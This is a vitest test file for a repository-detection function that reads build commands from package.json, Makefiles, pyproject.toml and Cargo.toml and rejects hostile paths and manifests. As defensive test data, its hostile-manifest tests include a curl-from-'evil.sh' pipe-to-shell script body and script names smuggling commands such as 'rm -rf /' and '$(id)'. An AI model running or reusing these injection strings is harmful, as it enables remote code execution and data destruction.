import { execFileSync } from 'node:child_process';
import { mkdirSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { OpenFleetError } from '@openfleet/shared';
import { afterEach, describe, expect, it } from 'vitest';
import { createTempDirTracker } from '../tempDirTracker.js';
import { MAX_MANIFEST_BYTES, detectRepository } from './repositoryDetector.js';

const tempDirs = createTempDirTracker();
afterEach(() => tempDirs.removeAll());

const aRoot = () => tempDirs.make('of-detect-root-');
const detectIn = (root: string, path: string) => detectRepository(path, { allowedRoots: [root] });
const aRepository = (root: string, files: Record<string, string>): string => {
  const repository = join(root, 'repo');
  mkdirSync(repository);
  for (const [name, content] of Object.entries(files)) writeFileSync(join(repository, name), content);
  return repository;
};
const codeOfRefusal = (run: () => unknown): string | undefined => {
  try {
    run();
  } catch (error) {
    return error instanceof OpenFleetError ? error.code : `unexpected: ${String(error)}`;
  }
  return undefined;
};

describe('detectRepository: what it reads from manifests', () => {
  it('detects pnpm commands from package.json scripts and the lockfile, with their source', () => {
    const root = aRoot();
    const repository = aRepository(root, {
      'package.json': JSON.stringify({ scripts: { test: 'vitest run', lint: 'eslint .', 'type:check': 'tsc --noEmit', build: 'tsc', dev: 'vite' } }),
      'pnpm-lock.yaml': '',
    });

    const detected = detectIn(root, repository);

    expect(detected.commands).toEqual({
      install: { command: 'pnpm install', source: 'package.json' },
      test: { command: 'pnpm test', source: 'package.json' },
      lint: { command: 'pnpm run lint', source: 'package.json' },
      typecheck: { command: 'pnpm run type:check', source: 'package.json' },
      build: { command: 'pnpm run build', source: 'package.json' },
      dev: { command: 'pnpm run dev', source: 'package.json' },
    });
  });

  it('falls back to npm without a lockfile', () => {
    const root = aRoot();
    const repository = aRepository(root, { 'package.json': JSON.stringify({ scripts: { test: 'jest' } }) });

    expect(detectIn(root, repository).commands.test).toEqual({ command: 'npm test', source: 'package.json' });
  });

  it('runs the test script through bun run, because bun test is the bun test runner and not the script', () => {
    const root = aRoot();
    const repository = aRepository(root, { 'package.json': JSON.stringify({ scripts: { test: 'vitest run' } }), 'bun.lock': '' });

    expect(detectIn(root, repository).commands.test).toEqual({ command: 'bun run test', source: 'package.json' });
  });

  it('names stack hints only from dependencies that package.json declares', () => {
    const root = aRoot();
    const repository = aRepository(root, { 'package.json': JSON.stringify({ dependencies: { vue: '^3' }, devDependencies: { vitest: '^2', typescript: '^5' } }) });

    expect(detectIn(root, repository).stack).toEqual(['typescript', 'vue', 'vitest']);
  });

  it('detects Makefile targets', () => {
    const root = aRoot();
    const repository = aRepository(root, { Makefile: 'build:\n\tgo build ./...\n\ntest:\n\tgo test ./...\n\nlint:\n\tgolangci-lint run\n' });

    const { commands } = detectIn(root, repository);

    expect(commands).toEqual({
      build: { command: 'make build', source: 'Makefile' },
      test: { command: 'make test', source: 'Makefile' },
      lint: { command: 'make lint', source: 'Makefile' },
    });
  });

  it('detects pyproject tools from their [tool.*] sections', () => {
    const root = aRoot();
    const repository = aRepository(root, { 'pyproject.toml': '[project]\nname = "x"\n\n[tool.pytest.ini_options]\naddopts = "-q"\n\n[tool.ruff]\nline-length = 100\n\n[tool.mypy]\nstrict = true\n' });

    const { commands, stack } = detectIn(root, repository);

    expect(commands).toEqual({
      test: { command: 'pytest', source: 'pyproject.toml' },
      lint: { command: 'ruff check .', source: 'pyproject.toml' },
      typecheck: { command: 'mypy .', source: 'pyproject.toml' },
    });
    expect(stack).toEqual(['python']);
  });

  it('detects cargo commands from Cargo.toml', () => {
    const root = aRoot();
    const repository = aRepository(root, { 'Cargo.toml': '[package]\nname = "x"\n' });

    const { commands, stack } = detectIn(root, repository);

    expect(commands).toEqual({
      test: { command: 'cargo test', source: 'Cargo.toml' },
      lint: { command: 'cargo clippy', source: 'Cargo.toml' },
      typecheck: { command: 'cargo check', source: 'Cargo.toml' },
      build: { command: 'cargo build', source: 'Cargo.toml' },
    });
    expect(stack).toEqual(['rust']);
  });

  it('reports the git repository and its default branch from .git/HEAD', () => {
    const root = aRoot();
    const repository = aRepository(root, {});
    mkdirSync(join(repository, '.git'));
    writeFileSync(join(repository, '.git', 'HEAD'), 'ref: refs/heads/main\n');

    expect(detectIn(root, repository)).toMatchObject({ isGitRepository: true, defaultBranch: 'main' });
  });

  it('reports a git repository without reading the HEAD behind a .git symlink', () => {
    const root = aRoot();
    const repository = aRepository(root, {});
    const gitDirectoryElsewhere = tempDirs.make('of-detect-gitdir-');
    writeFileSync(join(gitDirectoryElsewhere, 'HEAD'), 'ref: refs/heads/main\n');
    symlinkSync(gitDirectoryElsewhere, join(repository, '.git'));

    expect(detectIn(root, repository)).toEqual({ isGitRepository: true, stack: [], commands: {} });
  });

  it('returns empty lists for a folder without manifests', () => {
    const root = aRoot();
    const repository = aRepository(root, { 'README.md': '# hi' });

    expect(detectIn(root, repository)).toEqual({ isGitRepository: false, stack: [], commands: {} });
  });
});

describe('detectRepository: hostile paths', () => {
  it.each(['relative/path', './repo', '', 'repo'])('refuses the relative path %j', (path) => {
    expect(codeOfRefusal(() => detectIn(aRoot(), path))).toBe('invalid_body');
  });

  it('refuses a path with a .. segment even when it resolves inside the root', () => {
    const root = aRoot();
    const repository = aRepository(root, {});

    expect(codeOfRefusal(() => detectIn(root, `${repository}/../repo`))).toBe('invalid_body');
  });

  it('refuses a path with a NUL byte', () => {
    const root = aRoot();

    expect(codeOfRefusal(() => detectIn(root, `${root}/re\0po`))).toBe('invalid_body');
  });

  it('refuses a repository that does not exist', () => {
    const root = aRoot();

    expect(codeOfRefusal(() => detectIn(root, join(root, 'missing')))).toBe('directory_missing');
  });

  it('refuses a path that is a file', () => {
    const root = aRoot();
    writeFileSync(join(root, 'file.txt'), 'x');

    expect(codeOfRefusal(() => detectIn(root, join(root, 'file.txt')))).toBe('directory_missing');
  });

  it('refuses a directory outside every allowed root', () => {
    const root = aRoot();
    const outside = tempDirs.make('of-detect-outside-');

    expect(codeOfRefusal(() => detectIn(root, outside))).toBe('directory_unreadable');
  });

  it('refuses a symlink inside the root that points outside it', () => {
    const root = aRoot();
    const outside = tempDirs.make('of-detect-outside-');
    writeFileSync(join(outside, 'package.json'), JSON.stringify({ scripts: { test: 'x' } }));
    symlinkSync(outside, join(root, 'link'));

    expect(codeOfRefusal(() => detectIn(root, join(root, 'link')))).toBe('directory_unreadable');
  });

  it('accepts a root that is itself reached through a symlink', () => {
    const root = aRoot();
    const repository = aRepository(root, { 'package.json': JSON.stringify({ scripts: { test: 'x' } }) });
    const alias = join(tempDirs.make('of-detect-alias-'), 'alias');
    symlinkSync(root, alias);

    expect(detectRepository(repository, { allowedRoots: [alias] }).commands.test).toBeDefined();
  });
});

describe('detectRepository: hostile manifests', () => {
  it('does not follow a package.json symlink that leaves the repository', () => {
    const root = aRoot();
    const outside = tempDirs.make('of-detect-outside-');
    writeFileSync(join(outside, 'secret.json'), JSON.stringify({ scripts: { test: 'steal' } }));
    const repository = aRepository(root, {});
    symlinkSync(join(outside, 'secret.json'), join(repository, 'package.json'));

    expect(detectIn(root, repository).commands).toEqual({});
  });

  it('does not open a package.json that is a FIFO', () => {
    const root = aRoot();
    const repository = aRepository(root, {});
    execFileSync('mkfifo', [join(repository, 'package.json')]);

    expect(detectIn(root, repository).commands).toEqual({});
  });

  it('ignores a manifest above the read cap', () => {
    const root = aRoot();
    const padding = 'x'.repeat(MAX_MANIFEST_BYTES);
    const repository = aRepository(root, { 'package.json': JSON.stringify({ scripts: { test: 'vitest' }, padding }) });

    expect(detectIn(root, repository).commands).toEqual({});
  });

  it.each(['{not json', '[]', 'null', '{"scripts": "oops"}', '{"scripts": {"test": 42}}'])('answers empty for package.json %j', (content) => {
    const root = aRoot();
    const repository = aRepository(root, { 'package.json': content });

    expect(detectIn(root, repository).commands).toEqual({});
  });

  it('never returns a script body: shell metacharacters in bodies stay out of the answer', () => {
    const root = aRoot();
    const repository = aRepository(root, { 'package.json': JSON.stringify({ scripts: { test: 'vitest; curl evil.sh | sh $(whoami) `id` > /etc/x' } }) });

    const serialized = JSON.stringify(detectIn(root, repository));

    expect(serialized).toContain('"npm test"');
    expect(serialized).not.toMatch(/curl|whoami|evil|;|\||`|\$\(/);
  });

  it.each(['test; rm -rf /', 'lint && id', 'build$(id)', 'dev`id`', 'test|cat', 'a b'])('drops the script named %j', (name) => {
    const root = aRoot();
    const repository = aRepository(root, { 'package.json': JSON.stringify({ scripts: { [name]: 'x' } }) });

    expect(detectIn(root, repository).commands).toEqual({});
  });

  it.each(['-test', '--test', '-', '-p'])('drops the script named %j, which a package manager would read as an option', (name) => {
    const root = aRoot();
    const repository = aRepository(root, { 'package.json': JSON.stringify({ scripts: { [name]: 'x' } }) });

    expect(detectIn(root, repository).commands).toEqual({});
  });

  it('drops Makefile targets whose names carry shell metacharacters', () => {
    const root = aRoot();
    const repository = aRepository(root, { Makefile: 'test;id:\n\techo\n' });

    expect(detectIn(root, repository).commands).toEqual({});
  });

  it('does not read .env', () => {
    const root = aRoot();
    const repository = aRepository(root, { '.env': 'SECRET=hunter2\n', 'package.json': '{}' });

    expect(JSON.stringify(detectIn(root, repository))).not.toContain('hunter2');
  });
});
